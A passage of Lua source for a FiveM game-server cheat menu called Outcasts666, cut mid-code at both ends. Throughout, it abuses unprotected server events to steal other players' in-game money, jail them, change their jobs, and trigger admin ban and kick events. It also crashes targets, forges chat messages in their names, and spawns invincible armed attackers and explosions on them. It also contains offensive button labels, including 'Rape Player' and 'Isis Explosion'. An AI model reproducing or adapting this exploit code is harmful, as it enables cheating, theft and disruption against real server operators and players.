					TriggerEvent("esx-qalle-jail:openJailMenu")
                elseif Outcasts666.Button("~h~~g~ESX ~s~Unjail") then
                    TriggerServerEvent('esx_jailer:unjailTime', -1)
                    TriggerServerEvent('JailUpdate', 0)
                    TriggerEvent('UnJP')
                    TriggerEvent('esx-qalle-jail:unJailPlayer')
                elseif Outcasts666.Button("~s~~h~Set hunger to ~h~~g~100%") then
                    TriggerEvent("esx_status:set", "hunger", 1000000)
                elseif Outcasts666.Button("~s~~h~Set thirst to ~h~~g~100%") then
                    TriggerEvent("esx_status:set", "thirst", 1000000)
                elseif Outcasts666.Button("~h~~g~Heal") then
                    SetEntityHealth(PlayerPedId(-1), 200)
                elseif Outcasts666.Button("~h~~b~Armour") then
                    SetPedArmour(PlayerPedId(-1), 200)
                elseif Outcasts666.Button('~g~~h~ESX ~r~Revive') then
                    local f = KeyboardInput('Enter Player ID or all', '', 1000)
                    if f then
                        if f == 'all' then
                            for i = 0, 128 do
                                TriggerEvent('esx_ambulancejob:revive', GetPlayerServerId(i))
                                TriggerEvent('esx_ambulancejob:revive', GetPlayerServerId(i))
                            end
                        else
                            TriggerEvent('esx_ambulancejob:revive', f)
                            TriggerEvent('esx_ambulancejob:revive', f)
                        end
                    end
				elseif
                    Outcasts666.CheckBox(
                        '~h~Infinite Stamina',
                        InfStamina,
                        function(dR)
                            InfStamina = dR
                        end
                    )
                 then
                elseif
                    Outcasts666.CheckBox(
                        '~h~Thermal ~o~Vision',
                        bTherm,
                        function(bTherm)
                        end
                    )
                 then
                    therm = not therm
                    bTherm = therm
                    SetSeethrough(therm)
                elseif
                    Outcasts666.CheckBox(
                        '~h~Fast Run',
                        fastrun,
                        function(dR)
                            fastrun = dR
                        end
                    )
                 then
                elseif
                    Outcasts666.CheckBox(
                        '~h~Super Jump',
                        SuperJump,
                        function(dR)
                            SuperJump = dR
                        end
                    )
                 then
                elseif
                    Outcasts666.CheckBox(
                        '~h~Noclip',
                        Noclip,
                        function(dR)
                            Noclip = dR
                        end
                    )
                 then
                end
                
                    Outcasts666.Display()
                elseif Outcasts666.IsMenuOpened("OnlinePlayersMenu") then
                        for i = 0, 128 do
                            if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and Outcasts666.MenuButton(GetPlayerName(i).." ID = ["..GetPlayerServerId(i).."] i = ["..i.."] "..(IsPedDeadOrDying(GetPlayerPed(i), 1) and "~r~DEAD" or "~g~ALIVE"), "PlayerOptionsMenu") then
                                SelectedPlayer = i
                            end
                        end
    
                        Outcasts666.Display()
                    elseif Outcasts666.IsMenuOpened("PlayerOptionsMenu") then
                        Outcasts666.SetSubTitle("PlayerOptionsMenu", "Player Options ["..GetPlayerName(SelectedPlayer).."]")
                        if Outcasts666.Button('Spectate', (Spectating and "~g~[SPECTATING]")) then
                            SpectatePlayer(SelectedPlayer)
                        elseif Outcasts666.Button('Teleport To') then
                            local Entity = IsPedInAnyVehicle(PlayerPedId(), false) and GetVehiclePedIsUsing(PlayerPedId()) or PlayerPedId()
                            SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)
                        elseif Outcasts666.Button("Crash Player") then
                            crash(SelectedPlayer)
                        elseif Outcasts666.Button("Semi God") then
                            local eD = "stt_prop_stunt_soccer_ball"
                            while not HasModelLoaded(GetHashKey(eD)) do 
                                Citizen.Wait(0) RequestModel(GetHashKey(eD)) 
                            end
                            local eE = CreateObject(GetHashKey(eD), 0, 0, 0, true, true, false) 
                            SetEntityVisible(eE, 0, 0) 
                            AttachEntityToEntity(eE, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005), 0, 0, -1.0, 0, 0, 0, false, true, true, true, 1, true) 
                        elseif Outcasts666.Button("Heal Player") then
                            local eF = "PICKUP_HEALTH_STANDARD"
                            local eG = GetHashKey(eF) 
                            local cM = GetEntityCoords(GetPlayerPed(SelectedPlayer)) 
                            CreateAmbientPickup(eG, cM.x, cM.y, cM.z + 1.0, 1, 1, eG, 1, 0) 
                            SetPickupRegenerationTime(pickup, 60) 
                        elseif Outcasts666.MenuButton("∑Troll Options", "PlayerTrollMenu") then
                        elseif Outcasts666.MenuButton("∑ESX Options", "PlayerESXMenu") then
                        elseif Outcasts666.MenuButton("∑Give Single Weapon", "SingleWepPlayer") then
                        elseif Outcasts666.Button("Give Ammo") then
                            for i = 1, #allWeapons do
                                AddAmmoToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 250)
                            end
                        elseif Outcasts666.Button("Give All Weapons") then
                            for i = 1, #allWeapons do
                                GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, false)
                            end	
                        elseif Outcasts666.Button("Remove All Weapons") then
                            for i = 1, #allWeapons do
                                RemoveAllPedWeapons(GetPlayerPed(SelectedPlayer), true)
                            end
                        elseif Outcasts666.Button("Give Vehicle") then
                            local ped = GetPlayerPed(SelectedPlayer)
                            local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
        
                            if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
                                RequestModel(ModelName)
                                while not HasModelLoaded(ModelName) do
                                    Citizen.Wait(0)
                                end
        
                                local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(ped), GetEntityHeading(ped), true, true)
                            else
                                drawNotification("~r~Model is not valid!")
                            end
                        elseif Outcasts666.Button("Kick From Vehicle") then
                            ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
                        elseif Outcasts666.Button("Delete Vehicle") then
                            DelVeh(GetVehiclePedIsUsing(SelectedPlayer))
                        end
    
                        Outcasts666.Display()
                    elseif Outcasts666.IsMenuOpened("PlayerESXMenu") then
                        if Outcasts666.MenuButton("∑ESX Triggers", "PlayerESXTriggerMenu") then
                        elseif Outcasts666.MenuButton("∑ESX Jobs", "PlayerESXJobMenu") then
                        end
    
                        Outcasts666.Display()
                    elseif Outcasts666.IsMenuOpened("PlayerESXTriggerMenu") then
                        if Outcasts666.Button("ESX Revive") then
                            TriggerServerEvent("esx_ambulancejob:revive",GetPlayerServerId(selectedPlayer))
                        elseif Outcasts666.Button("ESX Give Money To Player From Your Wallet") then
                            local d = KeyboardInput("Enter amount of money to give","",100)
                            if d ~= "" then
                                TriggerServerEvent('esx:giveInventoryItem',GetPlayerServerId(selectedPlayer),"item_money","money",d)
                            end 
                        elseif Outcasts666.Button("ESX Steal Money From Player") then
                            local d=KeyboardInput("Enter amount of money to steal","",100)
                            if d ~= "" then 
                                TriggerServerEvent('esx:removeInventoryItem',GetPlayerServerId(selectedPlayer),"item_money","money",d)
                            end 
                        elseif Outcasts666.Button('~h~~b~Police Handcuff Player') then
                        TriggerServerEvent('esx_policejob:handcuff', GetPlayerServerId(SelectedPlayer))
                        elseif Outcasts666.Button('~h~~b~Police Drag Player') then
                        TriggerServerEvent('esx_policejob:drag', GetPlayerServerId(SelectedPlayer))
                        elseif Outcasts666.Button('~h~~b~Police Put Player In Car') then
                        TriggerServerEvent('esx_policejob:putInVehicle', GetPlayerServerId(SelectedPlayer))
                        elseif Outcasts666.Button('~h~~b~Police Get Player out of Car') then
                        TriggerServerEvent('esx_policejob:OutVehicle', GetPlayerServerId(SelectedPlayer))
                        elseif Outcasts666.Button('~h~~b~Mafia Handcuff Player') then
                        TriggerServerEvent('esx_mafiajob:handcuff', GetPlayerServerId(SelectedPlayer))
                        elseif Outcasts666.Button('~h~~b~Mafia Drag Player') then
                        TriggerServerEvent('esx_mafiajob:drag', GetPlayerServerId(SelectedPlayer))
                        elseif Outcasts666.Button('~h~~b~Mafia Put Player In Car') then
                        TriggerServerEvent('esx_mafiajob:putInVehicle', GetPlayerServerId(SelectedPlayer))
                        elseif Outcasts666.Button('~h~~b~Mafia Get Player out of Car') then
                        TriggerServerEvent('esx_mafiajob:OutVehicle', GetPlayerServerId(SelectedPlayer))
                        elseif Outcasts666.Button('~h~~b~Gang Handcuff Player') then
                        TriggerServerEvent('esx_gangjob:handcuff', GetPlayerServerId(SelectedPlayer))
                        elseif Outcasts666.Button('~h~~b~Gang Drag Player') then
                        TriggerServerEvent('esx_gangjob:drag', GetPlayerServerId(SelectedPlayer))
                        elseif Outcasts666.Button('~h~~b~Gang Put Player In Car') then
                        TriggerServerEvent('esx_gangjob:putInVehicle', GetPlayerServerId(SelectedPlayer))
                        elseif Outcasts666.Button('~h~~b~Gang Get Player out of Car') then
                        TriggerServerEvent('esx_gangjob:OutVehicle', GetPlayerServerId(SelectedPlayer))
                        elseif Outcasts666.Button('~h~~b~Cartel Handcuff Player') then
                        TriggerServerEvent('esx_carteljob:handcuff', GetPlayerServerId(SelectedPlayer))
                        elseif Outcasts666.Button('~h~~b~Cartel Drag Player') then
                        TriggerServerEvent('esx_carteljob:drag', GetPlayerServerId(SelectedPlayer))
                        elseif Outcasts666.Button('~h~~b~Cartel Put Player In Car') then
                        TriggerServerEvent('esx_carteljob:putInVehicle', GetPlayerServerId(SelectedPlayer))
                        elseif Outcasts666.Button('~h~~b~Cartel Get Player out of Car') then
                        TriggerServerEvent('esx_carteljob:OutVehicle', GetPlayerServerId(SelectedPlayer))
                        elseif Outcasts666.Button("ESX Send To Jail") then
                        TriggerServerEvent("esx-qalle-jail:jailPlayer",GetPlayerServerId(selectedPlayer),5000,"Jailed")
                        TriggerServerEvent("esx_jailer:sendToJail",GetPlayerServerId(selectedPlayer),45*60)
                        TriggerServerEvent("esx_jail:sendToJail",GetPlayerServerId(selectedPlayer),45*60)
                        TriggerServerEvent("js:jailuser",GetPlayerServerId(selectedPlayer),45*60,"Jailed")
                        elseif Outcasts666.Button("ESX Get Out Of Jail") then
                            local ped = selectedPlayer
                            TriggerServerEvent("esx-qalle-jail:jailPlayer",GetPlayerServerId(ped),0,"escaperino")
                            TriggerServerEvent("esx_jailer:sendToJail",GetPlayerServerId(ped),0)
                            TriggerServerEvent("esx_jail:sendToJail",GetPlayerServerId(ped),0)
                            TriggerServerEvent("js:jailuser",GetPlayerServerId(ped),0,"escaperino")
                        end
    
                        Outcasts666.Display()
                    elseif Outcasts666.IsMenuOpened("PlayerESXJobMenu") then
                        if Outcasts666.Button("Unemployed") then
                            TriggerServerEvent('NB:destituerplayer',GetPlayerServerId(selectedPlayer))
                        elseif Outcasts666.Button("Police") then
                            TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(selectedPlayer),"police",3)
                        elseif Outcasts666.Button("Mechanic") then
                            TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(selectedPlayer),"mecano",3)
                        elseif Outcasts666.Button("Taxi") then
                            TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(selectedPlayer),"taxi",3)
                        elseif Outcasts666.Button("Ambulance") then
                            TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(selectedPlayer),"ambulance",3)
                        elseif Outcasts666.Button("Real Estate Agent") then
                            TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(selectedPlayer),"realestateagent",3)
                        elseif Outcasts666.Button("Car Dealer") then
                            TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(selectedPlayer),"cardealer",3)
                        end
                        
                        
                        Outcasts666.Display()
                    elseif Outcasts666.IsMenuOpened("PlayerTrollMenu") then
                        if Outcasts666.Button ("Fake Chat Message") then 
                            local cX=KeyboardInput("Enter message to send","",100)
                            local cY=GetPlayerName(selectedPlayer)
                            if cX then 
                                TriggerServerEvent('_chat:messageEntered',cY,{0,0x99,255},cX)
                            end 
    
                        elseif Outcasts666.Button("Cage Player") then
                            freezePlayer = true
                            Citizen.Wait(50)
                            SpawnObjOnPlayer(GetHashKey("prop_gascage01"))
                            Citizen.Wait(50)
                            freezePlayer = false
                        elseif Outcasts666.Button("Rape Player") then
                            rape(SelectedPlayer)
                        elseif Outcasts666.Button("Mellotrainer Ban") then
                            local reason = KeyboardInput("Enter Reason Here", "", 100) 
                            if reason then 
                                TriggerServerEvent("mellotrainer:adminTempBan",GetPlayerServerId(SelectedPlayer), reason) 
                            end 
                        elseif Outcasts666.Button("Mellotrainer Kick") then
                            local reason2 = KeyboardInput("Enter Reason Here", "", 100) 
                            if reason2 then 
                                TriggerServerEvent("mellotrainer:adminKick",GetPlayerServerId(SelectedPlayer), reason2)
                            end 
                        elseif Outcasts666.MenuButton("∑Ram Vehicles Into Player", "VehicleRamMenu") then
                        elseif Outcasts666.MenuButton("∑Spawn Peds", "PlayerSpawnPedsMenu") then
                        elseif Outcasts666.MenuButton("∑Spawn Props On Player", "SpawnPropsMenu") then
                        elseif Outcasts666.CheckBox(
                            "Freeze Player",
                            freezePlayer,
                            function(enabled)
                                freezePlayer = enabled
                            end)
                        then
                        elseif Outcasts666.Button("Small invisible Explosion") then
                            AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, false, true, 0)
                        elseif Outcasts666.Button("~b~Isis Explosion") then
                            AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, true, false, 100000.0)
                        end
                                        
                        Outcasts666.Display()
                    elseif Outcasts666.IsMenuOpened("SpawnPropsMenu") then
                        if Outcasts666.CheckBox(
                            "Attach Prop To Player",
                            attachProp,
                            function(enabled)
                                attachProp = enabled
                            end)
                        then
                        elseif Outcasts666.ComboBox("Bone", { "Head", "Right Hand" }, currentBone, selectedBone, function(currentIndex, selectedIndex)
                            currentBone = currentIndex
                            selectedBone = selectedIndex
                        end)
                        then
                        elseif Outcasts666.Button("Weed") then
                            local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                            local prop = "prop_weed_01"
                            while not HasModelLoaded(GetHashKey(prop)) do 
                                Citizen.Wait(0) 
                                RequestModel(GetHashKey(prop)) 
                            end
                            local obj = CreateObject(GetHashKey(prop),coords.x,coords.y,coords.z,true,true,true)
                            if attachProp then
                                if selectedBone == 1 then
                                    AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                                elseif selectedBone == 2 then
                                    AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                                end
                            end	
                        elseif Outcasts666.Button("UFO") then
                            local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                            local prop = "p_spinning_anus_s"
                            while not HasModelLoaded(GetHashKey(prop)) do 
                                Citizen.Wait(0) 
                                RequestModel(GetHashKey(prop)) 
                            end
                            local obj = CreateObject(GetHashKey(prop),coords.x,coords.y,coords.z,true,true,true)
                            if attachProp then
                                if selectedBone == 1 then
                                    AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                                elseif selectedBone == 2 then
                                    AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                                end
                            end	
                        elseif Outcasts666.Button("Windmill") then
                            local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                            local prop = "prop_windmill_01"
                            while not HasModelLoaded(GetHashKey(prop)) do 
                                Citizen.Wait(0) 
                                RequestModel(GetHashKey(prop)) 
                            end
                            local obj = CreateObject(GetHashKey(prop),coords.x,coords.y,coords.z,true,true,true)
                            if attachProp then
                                if selectedBone == 1 then
                                    AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),39317),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                                elseif selectedBone == 2 then
                                    AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                                end
                            end	
                        elseif Outcasts666.Button("Custom Prop") then
                            local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                            local input = KeyboardInput("Enter Prop Name", "", 100)                       
                            if IsModelValid(input) then
                                local obj = CreateObject(GetHashKey(input),coords.x,coords.y,coords.z,true,true,true)
                                if attachProp then
                                    if selectedBone == 1 then
                                        AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                                    elseif selectedBone == 2 then
                                        AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                                    end
                                end	
                            else
                                drawNotification("Invalid Model!")
                            end
                        end
    
                        Outcasts666.Display()
                    elseif Outcasts666.IsMenuOpened("PlayerSpawnPedsMenu") then
				if Outcasts666.Button('~r~~r~Spawn ~s~Mountain Lion ~r~Attack') then
                    local mtlion = "A_C_MtLion"
                    for i = 0, 1 do
                        local co = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(GetHashKey(mtlion))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(mtlion)) then
                            local ped =
                                CreatePed(21, GetHashKey(mtlion), co.x, co.y, co.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(50)
                                NetToPed(ei)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, co.x, co.y, co.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
				elseif Outcasts666.Button('~r~~r~Spawn ~s~Dog Rottweiler ~r~Attack') then
                    local mtlion = "A_C_Rottweiler"
                    for i = 0, 1 do
                        local co = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(GetHashKey(mtlion))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(mtlion)) then
                            local ped =
                                CreatePed(21, GetHashKey(mtlion), co.x, co.y, co.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(50)
                                NetToPed(ei)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, co.x, co.y, co.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
				elseif Outcasts666.Button('~r~~r~Spawn ~s~Dog Husky ~r~Attack') then
                    local mtlion = "A_C_Husky"
                    for i = 0, 1 do
                        local co = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(GetHashKey(mtlion))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(mtlion)) then
                            local ped =
                                CreatePed(21, GetHashKey(mtlion), co.x, co.y, co.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(50)
                                NetToPed(ei)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, co.x, co.y, co.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
				elseif Outcasts666.Button('~r~~r~Sea Spawn ~s~Shark ~r~Attack') then
                    local mtlion = "A_C_SharkTiger"
                    for i = 0, 1 do
                        local co = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(GetHashKey(mtlion))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(mtlion)) then
                            local ped =
                                CreatePed(21, GetHashKey(mtlion), co.x, co.y, co.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(50)
                                NetToPed(ei)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, co.x, co.y, co.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
                            elseif Outcasts666.Button("~h~Spawn ~s~Swat army with AK") then 
                                local eU = "s_m_y_swat_01"
                                local eS = "WEAPON_ASSAULTRIFLE"
                                for i = 0, 10 do 
                                    local cM = GetEntityCoords(GetPlayerPed(SelectedPlayer)) 
                                    RequestModel(GetHashKey(eU)) 
                                    Citizen.Wait(50) 
                                        if HasModelLoaded(GetHashKey(eU)) then 
                                            local ped = CreatePed(21, GetHashKey(eU), cM.x + i, cM.y - i, cM.z, 0, true, true) and CreatePed(21, GetHashKey(eU), cM.x - i, cM.y + i, cM.z, 0, true, true) NetworkRegisterEntityAsNetworked(ped) 
                                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then 
                                                local eT = PedToNet(ped) NetworkSetNetworkIdDynamic(eT, false) SetNetworkIdCanMigrate(eT, true) 
                                                SetNetworkIdExistsOnAllMachines(eT, true) 
                                                Citizen.Wait(500) 
                                                NetToPed(eT) 
                                                GiveWeaponToPed(ped, GetHashKey(eS), 9999, 1, 1) 
                                                SetEntityInvincible(ped, true) 
                                                SetPedCanSwitchWeapon(ped, true) 
                                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16) 
                                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then 
                                                TaskCombatHatedTargetsInArea(ped, cM.x, cM.y, cM.z, 500)
                                            else 
                                                Citizen.Wait(0) 
                                            end 
                                        end
                                    end 
                            elseif Outcasts666.Button("~h~Spawn ~s~Swat army with RPG") then 
                                local eU = "s_m_y_swat_01"
                                local eS = "weapon_rpg"
                                for i = 0, 10 do 
                                    local cM = GetEntityCoords(GetPlayerPed(SelectedPlayer)) 
                                    RequestModel(GetHashKey(eU)) 
                                    Citizen.Wait(50) 
                                    if HasModelLoaded(GetHashKey(eU)) then 
                                        local ped = CreatePed(21, GetHashKey(eU), cM.x + i, cM.y - i, cM.z, 0, true, true) and CreatePed(21, GetHashKey(eU), cM.x - i, cM.y + i, cM.z, 0, true, true) 
                                        NetworkRegisterEntityAsNetworked(ped) 
                                        if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then 
                                            local eT = PedToNet(ped) 
                                            NetworkSetNetworkIdDynamic(eT, false) 
                                            SetNetworkIdCanMigrate(eT, true) 
                                            SetNetworkIdExistsOnAllMachines(eT, true) 
                                            Citizen.Wait(500) 
                                            NetToPed(eT) 
                                            GiveWeaponToPed(ped, GetHashKey(eS), 9999, 1, 1) 
                                            SetEntityInvincible(ped, true) 
                                            SetPedCanSwitchWeapon(ped, true) 
                                            TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16) 
                                        elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then 
                                            TaskCombatHatedTargetsInArea(ped, cM.x, cM.y, cM.z, 500)
                                        else 
                                            Citizen.Wait(0) 
                                        end 
                                    end 
                                end 
                            elseif Outcasts666.Button("~h~Spawn ~s~Swat army with Flaregun") then 
                                local eU = "s_m_y_swat_01"
                                local eS = "weapon_flaregun"
                                for i = 0, 10 do 
                                    local cM = GetEntityCoords(GetPlayerPed(SelectedPlayer)) 
                                    RequestModel(GetHashKey(eU)) Citizen.Wait(50) 
                                    if HasModelLoaded(GetHashKey(eU)) then 
                                        local ped = CreatePed(21, GetHashKey(eU), cM.x + i, cM.y - i, cM.z, 0, true, true) and CreatePed(21, GetHashKey(eU), cM.x - i, cM.y + i, cM.z, 0, true, true) 
                                        NetworkRegisterEntityAsNetworked(ped) 
                                        if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then 
                                            local eT = PedToNet(ped) 
                                            NetworkSetNetworkIdDynamic(eT, false) 
                                            SetNetworkIdCanMigrate(eT, true) 
                                            SetNetworkIdExistsOnAllMachines(eT, true) 
                                            Citizen.Wait(500) 
                                            NetToPed(eT) 
                                            GiveWeaponToPed(ped, GetHashKey(eS), 9999, 1, 1) 
                                            SetEntityInvincible(ped, true) 
                                            SetPedCanSwitchWeapon(ped, true) 
                                            TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16) 
                                        elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then 
                                            TaskCombatHatedTargetsInArea(ped, cM.x, cM.y, cM.z, 500)
                                        else 
                                            Citizen.Wait(0) 
                                        end 
                                    end 
                                end 
                            elseif Outcasts666.Button("~h~Spawn ~s~Swat army with Railgun") then 
                                local eU = "s_m_y_swat_01"
                                local eS = "weapon_railgun"
                                for i = 0, 10 do 
                                    local cM = GetEntityCoords(GetPlayerPed(SelectedPlayer)) 
                                    RequestModel(GetHashKey(eU)) 
                                    Citizen.Wait(50) 
                                    if HasModelLoaded(GetHashKey(eU)) then 
                                        local ped = CreatePed(21, GetHashKey(eU), cM.x + i, cM.y - i, cM.z, 0, true, true) and CreatePed(21, GetHashKey(eU), cM.x - i, cM.y + i, cM.z, 0, true, true) 
                                        NetworkRegisterEntityAsNetworked(ped) 
                                        if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then 
                                            local eT = PedToNet(ped) 
                                            NetworkSetNetworkIdDynamic(eT, false) 
                                            SetNetworkIdCanMigrate(eT, true) 
                                            SetNetworkIdExistsOnAllMachines(eT, true) 
                                            Citizen.Wait(500) 
                                            NetToPed(eT) 
                                            GiveWeaponToPed(ped, GetHashKey(eS), 9999, 1, 1)
                                            SetEntityInvincible(ped, true) 
                                            SetPedCanSwitchWeapon(ped, true) 
                                            TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16) 
                                        elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then 
                                            TaskCombatHatedTargetsInArea(ped, cM.x, cM.y, cM.z, 500)
                                        else 
                                            Citizen.Wait(0) 
                                        end 
                                    end 
                                end 
				elseif Outcasts666.Button('~h~Spawn Swat in car ~r~Attack') then
                    local vehlist = {"FBI2", "FBI"}
                    local veh = vehlist[math.random(#vehlist)]
                    for i = 0, 1 do
                    local pos = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    local pitch = GetEntityPitch(GetPlayerPed(SelectedPlayer))
                    local roll = GetEntityRoll(GetPlayerPed(SelectedPlayer))
                    local yaw = GetEntityRotation(GetPlayerPed(SelectedPlayer)).z
                    local xf = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
                    local yf = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
                    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), false) then
                        local vt = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), 0)
                        NetworkRequestControlOfEntity(vt)
                        SetVehicleModKit(vt, 0)
                        ToggleVehicleMod(vt, 20, 1)
                        SetVehicleModKit(vt, 0)
                        SetVehicleTyresCanBurst(vt, 1)
                    end
                    local v = nil
                    RequestModel(veh)
                    RequestModel('s_m_y_swat_01')
                    while not HasModelLoaded(veh) and not HasModelLoaded('s_m_y_swat_01') do
                        RequestModel('s_m_y_swat_01')
                        Citizen.Wait(0)
                        RequestModel(veh)
                    end
                    if HasModelLoaded(veh) then
                        Citizen.Wait(50)
                        v =
                            CreateVehicle(
                            veh,
                            pos.x - (xf * 30),
                            pos.y - (yf * 30),
                            pos.z + 1,
                            GetEntityHeading(GetPlayerPed(SelectedPlayer)),
                            true,
                            false
                        )
                        if DoesEntityExist(v) then
                            NetworkRequestControlOfEntity(v)
                            SetVehicleDoorsLocked(v, 4)
                            RequestModel('s_m_y_swat_01')
                            Citizen.Wait(50)
                            if HasModelLoaded('s_m_y_swat_01') then
                                Citizen.Wait(50)
                                local ped = CreatePed(21, GetHashKey('s_m_y_swat_01'), pos.x, pos.y, pos.z, true, true)
                                local ped1 =
                                    CreatePed(21, GetHashKey('s_m_y_swat_01'), pos.x, pos.y, pos.z, true, true)
                                if DoesEntityExist(ped1) and DoesEntityExist(ped) then
                                    GiveWeaponToPed(ped, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
                                    GiveWeaponToPed(ped1, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
                                    SetPedIntoVehicle(ped, v, -1)
                                    SetPedIntoVehicle(ped1, v, 0)
                                    TaskDriveBy(
                                        ped,
                                        GetVehiclePedIsUsing(GetPlayerPed(SelectedPlayer)),
                                        pos.x,
                                        pos.y,
                                        pos.z,
                                        200,
                                        99,
                                        0,
                                        'FIRING_PATTERN_BURST_FIRE_DRIVEBY'
                                    )
